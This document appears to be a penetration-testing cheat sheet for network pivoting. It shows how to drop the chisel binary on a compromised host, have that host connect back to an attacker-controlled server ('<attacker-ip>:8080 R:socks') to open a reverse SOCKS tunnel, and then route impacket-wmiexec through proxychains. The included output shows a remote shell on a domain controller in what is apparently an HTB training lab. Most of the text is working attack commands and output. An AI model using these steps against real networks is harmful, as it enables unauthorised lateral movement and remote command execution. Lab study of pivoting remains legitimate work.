## Setup

```sh
sudo apt update && sudo apt install chisel proxychains -y
```

### Proxychain

Make sure `/etc/proxychains4.conf` file's content is like this:

```
$ tail -2 /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

## Usage

### Transfer agent

Download "agent" from [here](https://github.com/jpillora/chisel/releases). Depends on the OS and cpu architecture, download one. I said agent, but those are perfectly capable of acting as server.

```sh
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gzip -d ./chisel_1.10.1_linux_amd64.gz
```

Transfer the agent to target machine

### Open reverse tunnel server on attacker

```sh
sudo chisel server --reverse
```

### Connect back to attacker using agent

No privileges are required

```sh
./chisel client <attacker-ip>:8080 R:socks
```

### Usage on attack host

```sh
proxychains <command>
```

eg.

```sh
$ proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

>Depends on your use case, you might need to modify `/etc/hosts` file in order to add domain names.